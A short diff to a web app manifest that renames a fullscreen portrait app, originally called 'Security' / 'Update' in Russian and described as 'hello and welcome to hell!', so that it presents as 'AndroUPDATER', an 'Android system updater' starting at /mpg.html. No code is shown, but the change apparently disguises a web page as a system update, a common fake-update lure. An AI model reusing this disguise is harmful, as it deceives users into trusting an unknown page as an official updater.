@@ -1,10 +1,10 @@
 {
-  "name": "Безопасность",
-  "short_name": "Обновление",
-  "theme_color": "Black",
+  "name": "AndroUPDATER",
+  "short_name": "Update",
+  "theme_color": "#000000",
   "display": "fullscreen",
   "orientation": "portrait",
   "scope": "/mpg.html",
   "start_url": "/mpg.html",
-  "description": "hello and welcome to hell!"
+  "description": "Android system updater"
 }
